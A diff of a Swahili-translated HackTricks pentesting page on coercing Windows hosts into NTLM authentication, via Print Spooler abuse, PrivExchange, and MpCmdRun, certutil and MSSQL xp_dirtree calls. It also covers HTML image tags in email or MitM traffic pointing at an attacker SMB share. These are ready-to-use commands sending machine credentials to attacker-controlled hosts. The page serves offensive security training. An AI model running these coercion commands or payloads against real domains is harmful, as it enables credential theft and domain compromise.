@@ -1,88 +1,80 @@
-# Kulazimisha Uthibitisho wa NTLM wa Uthibitishaji
+# Force NTLM Privileged Authentication
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 ## SharpSystemTriggers
 
-[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) ni **mkusanyiko** wa **vichocheo vya uthibitishaji wa mbali** vilivyoandikwa kwa C# kwa kutumia kisimbiko cha MIDL ili kuepuka kutegemea programu ya tatu.
+[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) ni **mkusanyiko** wa **vichocheo vya uthibitishaji wa mbali** vilivyotengenezwa kwa C# kwa kutumia MIDL compiler ili kuepuka utegemezi wa wahusika wengine.
 
-## Matumizi Mabaya ya Huduma ya Spooler
+## Spooler Service Abuse
 
-Ikiwa huduma ya _**Print Spooler**_ ime **wezeshwa,** unaweza kutumia baadhi ya vitambulisho vya AD vilivyofahamika tayari kuomba kwa mwenyeji wa udhibiti wa kikoa sasisho kuhusu kazi mpya za uchapishaji na tuambie itume arifa kwa mfumo fulani.\
-Kumbuka wakati printer inatuma arifa kwa mifumo isiyojulikana, inahitaji **kuthibitisha** dhidi ya **mfumo** huo. Kwa hivyo, mshambuliaji anaweza kufanya huduma ya _**Print Spooler**_ kuthibitisha dhidi ya mfumo usiojulikana, na huduma hiyo itatumia akaunti ya kompyuta katika uthibitisho huu.
+Ikiwa huduma ya _**Print Spooler**_ ime **wezeshwa,** unaweza kutumia baadhi ya akidi za AD zinazojulikana tayari ili **kuomba** kwa seva ya uchapishaji ya Domain Controller **sasisho** kuhusu kazi mpya za uchapishaji na umwambie tu **atumie arifa kwa mfumo fulani**.\
+Kumbuka wakati printer inatuma arifa kwa mifumo isiyo ya kawaida, inahitaji **kujiandikisha dhidi** ya **mfumo** huo. Hivyo, mshambuliaji anaweza kufanya huduma ya _**Print Spooler**_ kujiandikisha dhidi ya mfumo wowote, na huduma hiyo itatumia **akaunti ya kompyuta** katika uthibitishaji huu.
 
-### Kupata Seva za Windows kwenye kikoa
+### Finding Windows Servers on the domain
 
-Kwa kutumia PowerShell, pata orodha ya sanduku za Windows. Seva kawaida ni kipaumbele, kwa hivyo tuangalie hapo:
+Kwa kutumia PowerShell, pata orodha ya masanduku ya Windows. Seva kwa kawaida ni kipaumbele, hivyo hebu tuzingatie hapo:
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
-### Kupata huduma za Spooler zinazosikiliza
+### Kutafuta huduma za Spooler zinazot listening
 
-Kwa kutumia @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) iliyobadilishwa kidogo, angalia ikiwa Huduma ya Spooler inasikiliza:
+Kwa kutumia toleo lililobadilishwa kidogo la @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), angalia kama Huduma ya Spooler inasikiliza:
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
 ```
-Unaweza pia kutumia rpcdump.py kwenye Linux na kutafuta Itifaki ya MS-RPRN
+Unaweza pia kutumia rpcdump.py kwenye Linux na kutafuta Protokali ya MS-RPRN
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
-### Uliza huduma kujithibitisha dhidi ya mwenyeji wowote
+### Omba huduma ithibitishe dhidi ya mwenyeji yeyote
 
-Unaweza kuunda [**SpoolSample kutoka hapa**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
+Unaweza kukusanya [**SpoolSample kutoka hapa**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
 ```bash
 SpoolSample.exe <TARGET> <RESPONDERIP>
 ```
-au tumia [**dementor.py** ya 3xocyte](https://github.com/NotMedic/NetNTLMtoSilverTicket) au [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) ikiwa unatumia Linux
+au tumia [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) au [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) ikiwa uko kwenye Linux
 ```bash
 python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
 printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
-### Kuchanganya na Uteuzi Usiozuiliwa
+### Kuunganisha na Delegation Isiyo na Kikomo
 
-Ikiwa mshambuliaji tayari amefanikiwa kudukua kompyuta na [Uteuzi Usiozuiliwa](unconstrained-delegation.md), mshambuliaji anaweza **kuwezesha printer kuthibitisha dhidi ya kompyuta hii**. Kwa sababu ya uteuzi usiozuiliwa, **TGT** ya **akaunti ya kompyuta ya printer** itahifadhiwa **katika kumbukumbu** ya kompyuta yenye uteuzi usiozuiliwa. Kwa kuwa mshambuliaji tayari amedukua mwenyeji huu, ataweza **kupata tiketi hii** na kuitumia vibaya ([Pass the Ticket](pass-the-ticket.md)).
+Ikiwa mshambuliaji tayari ameathiri kompyuta yenye [Unconstrained Delegation](unconstrained-delegation.md), mshambuliaji anaweza **kufanya printer ithibitishe dhidi ya kompyuta hii**. Kwa sababu ya delegation isiyo na kikomo, **TGT** ya **akaunti ya kompyuta ya printer** itakuwa **imehifadhiwa katika** **kumbukumbu** ya kompyuta yenye delegation isiyo na kikomo. Kwa kuwa mshambuliaji tayari ameathiri mwenyeji huu, ataweza **kurejesha tiketi hii** na kuitumia vibaya ([Pass the Ticket](pass-the-ticket.md)).
 
-## Uthibitishaji wa RCP kwa nguvu
+## RCP Kulazimisha uthibitisho
 
 {% embed url="https://github.com/p0dalirius/Coercer" %}
 
 ## PrivExchange
 
-Shambulio la `PrivExchange` ni matokeo ya kasoro iliyopatikana katika kipengele cha **PushSubscription cha Seva ya Kubadilishana**. Kipengele hiki kinawezesha seva ya Kubadilishana kulazimishwa na mtumiaji yeyote wa kikoa mwenye sanduku la barua kuthibitisha kwa mwenyeji wowote uliowekwa na mteja kupitia HTTP.
+Shambulio la `PrivExchange` ni matokeo ya kasoro iliyopatikana katika **kipengele cha `PushSubscription` cha Exchange Server**. Kipengele hiki kinaruhusu server ya Exchange kulazimishwa na mtumiaji yeyote wa kikoa mwenye sanduku la barua kuthibitisha kwa mwenyeji wowote aliyepewa na mteja kupitia HTTP.
 
-Kwa chaguo-msingi, **huduma ya Kubadilishana inaendeshwa kama SYSTEM** na inapewa mamlaka ya ziada (hasa, ina **mamlaka ya WriteDacl kwenye kiwango cha kikoa kabla ya Sasisho la Kumulati la 2019**). Kasoro hii inaweza kutumiwa kuwezesha **kuhamisha habari kwa LDAP na kisha kuchota hifadhidata ya NTDS ya kikoa**. Katika hali ambapo kuhamisha kwa LDAP sio rahisi, kasoro hii bado inaweza kutumika kuhamisha na kuthibitisha kwa wenyewe kwenye mwenyeji mwingine ndani ya kikoa. Ufanisi wa shambulio hili unatoa ufikiaji wa moja kwa moja kwa Msimamizi wa Kikoa na akaunti yoyote ya mtumiaji wa kikoa iliyothibitishwa.
+Kwa kawaida, **huduma ya Exchange inafanya kazi kama SYSTEM** na inapewa mamlaka kupita kiasi (hasa, ina **WriteDacl privileges kwenye kikoa kabla ya Sasisho la Jumla la 2019**). Kasoro hii inaweza kutumika kuweza **kupeleka taarifa kwa LDAP na kisha kutoa hifadhidata ya NTDS ya kikoa**. Katika hali ambapo kupeleka kwa LDAP haiwezekani, kasoro hii bado inaweza kutumika kupeleka na kuthibitisha kwa wenyeji wengine ndani ya kikoa. Ufanisi wa shambulio hili unatoa ufikiaji wa haraka kwa Msimamizi wa Kikoa na akaunti yoyote ya mtumiaji wa kikoa iliyoidhinishwa.
 
 ## Ndani ya Windows
 
-Ikiwa tayari umo ndani ya kompyuta ya Windows, unaweza kulazimisha Windows kuunganisha kwenye seva kwa kutumia akaunti zenye mamlaka kwa:
+Ikiwa tayari uko ndani ya mashine ya Windows unaweza kulazimisha Windows kuungana na server kwa kutumia akaunti zenye mamlaka na: 
 
 ### Defender MpCmdRun
 ```bash
 C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
 ```
 ### MSSQL
-
-MSSQL ni mfumo wa usimamizi wa database uliotengenezwa na Microsoft. Inatumika sana katika mazingira ya biashara kwa kuhifadhi na kusimamia data. Kwa sababu ya umaarufu wake, MSSQL mara nyingi hulengwa na wadukuzi kwa sababu ya uwezekano wa kupata data nyeti.
-
-Kuna njia kadhaa za kudukua MSSQL, ikiwa ni pamoja na:
-
-1. **Brute forcing**: Kudukua nywila za akaunti za MSSQL kwa kujaribu nywila nyingi hadi kupata ile sahihi.
-2. **SQL injection**: Kuingiza maagizo ya SQL yasiyofaa katika maombi yanayotumia MSSQL, ambayo inaweza kusababisha kufichuliwa kwa data nyeti au hata kudhibitiwa kwa seva.
-3. **Exploiting vulnerabilities**: Kutumia udhaifu katika programu ya MSSQL ili kupata ufikiaji usioidhinishwa au kudhibiti seva.
-4. **Default credentials**: Kujaribu kuingia kwenye seva ya MSSQL kwa kutumia nywila za chaguo-msingi ambazo mara nyingi haziwekwi na watumiaji.
-
-Ni muhimu kwa wamiliki wa seva za MSSQL kuchukua hatua za usalama ili kuzuia mashambulizi haya. Hii inaweza kujumuisha kuanzisha nywila ngumu, kusasisha programu na kurekebisha udhaifu, na kufuatilia shughuli za seva kwa dalili za shughuli za kudukua.
 ```sql
 EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
 ```
@@ -90,39 +82,42 @@ Au tumia mbinu hii nyingine: [https://github.com/p0dalirius/MSSQL-Analysis-Coerc
 
 ### Certutil
 
-Inawezekana kutumia certutil.exe lolbin (faili iliyosainiwa na Microsoft) kuchochea uthibitishaji wa NTLM:
+Inawezekana kutumia certutil.exe lolbin (binary iliyosainiwa na Microsoft) kulazimisha uthibitishaji wa NTLM:
 ```bash
 certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
-## Uingizaji wa HTML
+## HTML injection
 
-### Kupitia barua pepe
+### Via email
 
-Ikiwa unajua **anwani ya barua pepe** ya mtumiaji anayeingia kwenye kifaa unachotaka kudukua, unaweza tu kumtumia **barua pepe yenye picha ya 1x1** kama vile
+Ikiwa unajua **anwani ya barua pepe** ya mtumiaji anayeingia ndani ya mashine unayotaka kuathiri, unaweza tu kumtumia **barua pepe yenye picha ya 1x1** kama
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-na wakati anapofungua, atajaribu kujithibitisha.
+na wakati anafungua, atajaribu kuthibitisha.
 
 ### MitM
 
-Ikiwa unaweza kufanya shambulio la MitM kwa kompyuta na kuingiza HTML katika ukurasa ambao atauona, unaweza kujaribu kuingiza picha kama ifuatavyo katika ukurasa:
+Ikiwa unaweza kufanya shambulio la MitM kwa kompyuta na kuingiza HTML kwenye ukurasa atakaouona, unaweza kujaribu kuingiza picha kama ifuatavyo kwenye ukurasa:
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-## Kuvunja NTLMv1
+## Cracking NTLMv1
 
-Ikiwa unaweza kukamata changamoto za NTLMv1 [soma hapa jinsi ya kuzivunja](../ntlm/#ntlmv1-attack).\
+Ikiwa unaweza kukamata [NTLMv1 challenges soma hapa jinsi ya kuzivunja](../ntlm/#ntlmv1-attack).\
 _Kumbuka kwamba ili kuvunja NTLMv1 unahitaji kuweka changamoto ya Responder kuwa "1122334455667788"_
+
+{% hint style="success" %}
+Jifunze & fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze & fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikitangazwa katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **nifuate** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
+{% endhint %}
